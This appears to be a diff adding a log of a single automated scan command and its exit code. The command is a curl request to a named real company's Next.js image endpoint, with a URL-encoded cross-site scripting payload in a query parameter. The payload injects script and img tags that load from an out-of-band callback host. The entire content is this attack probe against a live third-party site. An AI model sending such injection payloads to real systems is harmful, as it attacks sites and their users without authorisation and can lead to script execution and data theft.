@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null 'https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Foobf6420af1d1b9.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%2Fx.js%3E%3C%2Fscript%3E%3Cimg+src%3Dhttp%3A%2F%2Foobf6420af1d1b9.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%2Fi%3E'
+# exit_code: 0
+# ---
+
